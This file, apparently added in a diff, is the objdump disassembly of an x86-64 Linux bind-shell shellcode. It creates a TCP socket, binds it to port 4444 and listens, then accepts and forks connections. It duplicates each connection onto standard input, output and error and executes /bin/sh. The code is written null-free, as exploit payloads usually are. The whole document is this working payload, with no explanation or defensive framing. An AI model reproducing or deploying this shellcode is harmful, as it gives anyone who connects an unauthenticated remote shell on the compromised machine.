@@ -1,0 +1,68 @@
+
+asm2.o:     file format elf64-x86-64
+
+
+Disassembly of section .text:
+
+0000000000000000 <accept-0x33>:
+   0:	31 c0                	xor    %eax,%eax
+   2:	b0 01                	mov    $0x1,%al
+   4:	89 c6                	mov    %eax,%esi
+   6:	fe c0                	inc    %al
+   8:	89 c7                	mov    %eax,%edi
+   a:	b2 06                	mov    $0x6,%dl
+   c:	b0 29                	mov    $0x29,%al
+   e:	0f 05                	syscall 
+  10:	93                   	xchg   %eax,%ebx
+  11:	48 31 c0             	xor    %rax,%rax
+  14:	50                   	push   %rax
+  15:	68 02 01 11 5c       	pushq  $0x5c110102
+  1a:	88 44 24 01          	mov    %al,0x1(%rsp)
+  1e:	48 89 e6             	mov    %rsp,%rsi
+  21:	b2 10                	mov    $0x10,%dl
+  23:	89 df                	mov    %ebx,%edi
+  25:	b0 31                	mov    $0x31,%al
+  27:	0f 05                	syscall 
+  29:	b0 05                	mov    $0x5,%al
+  2b:	89 c6                	mov    %eax,%esi
+  2d:	89 df                	mov    %ebx,%edi
+  2f:	b0 32                	mov    $0x32,%al
+  31:	0f 05                	syscall 
+
+0000000000000033 <accept>:
+  33:	31 d2                	xor    %edx,%edx
+  35:	31 f6                	xor    %esi,%esi
+  37:	89 df                	mov    %ebx,%edi
+  39:	b0 2b                	mov    $0x2b,%al
+  3b:	0f 05                	syscall 
+  3d:	89 c5                	mov    %eax,%ebp
+  3f:	b0 39                	mov    $0x39,%al
+  41:	0f 05                	syscall 
+  43:	09 c0                	or     %eax,%eax
+  45:	75 ec                	jne    33 <accept>
+
+0000000000000047 <dup2>:
+  47:	89 ef                	mov    %ebp,%edi
+  49:	48 31 c0             	xor    %rax,%rax
+  4c:	89 c6                	mov    %eax,%esi
+  4e:	b0 21                	mov    $0x21,%al
+  50:	0f 05                	syscall 
+  52:	fe c0                	inc    %al
+  54:	3c 02                	cmp    $0x2,%al
+  56:	76 ef                	jbe    47 <dup2>
+  58:	48 31 d2             	xor    %rdx,%rdx
+  5b:	48 bb ff 2f 62 69 6e 	movabs $0x68732f6e69622fff,%rbx
+  62:	2f 73 68 
+  65:	48 c1 eb 08          	shr    $0x8,%rbx
+  69:	53                   	push   %rbx
+  6a:	48 89 e7             	mov    %rsp,%rdi
+  6d:	48 31 c0             	xor    %rax,%rax
+  70:	50                   	push   %rax
+  71:	57                   	push   %rdi
+  72:	48 89 e6             	mov    %rsp,%rsi
+  75:	b0 3b                	mov    $0x3b,%al
+  77:	0f 05                	syscall 
+  79:	50                   	push   %rax
+  7a:	5f                   	pop    %rdi
+  7b:	b0 3c                	mov    $0x3c,%al
+  7d:	0f 05                	syscall 
